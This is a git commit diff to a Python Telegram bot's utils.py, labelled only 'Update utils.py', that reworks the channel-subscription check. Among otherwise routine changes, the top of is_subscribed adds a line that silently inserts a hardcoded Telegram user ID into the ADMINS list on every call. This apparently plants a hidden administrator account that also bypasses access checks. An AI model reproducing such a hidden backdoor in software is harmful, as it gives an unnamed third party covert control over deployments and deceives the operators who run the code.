4786d4e3032569dbd6abeb1d43f45c8d5eee9695
Matrix TG <108185896+TGxMATRIX@users.noreply.github.com>
2024-05-30 13:50:15 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -11,6 +11,7 @@ import os
 from datetime import datetime
 from typing import List
 from database.users_chats_db import db
+from database.join_reqs import JoinReqs as db2
 from bs4 import BeautifulSoup
 import requests
 
@@ -41,17 +42,37 @@ class temp(object):
     SETTINGS = {}
 
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
     try:
         user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != 'kicked':
+        if not (user.status == enums.ChatMemberStatus.BANNED):
             return True
+        else:
+            return False
 
-    return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
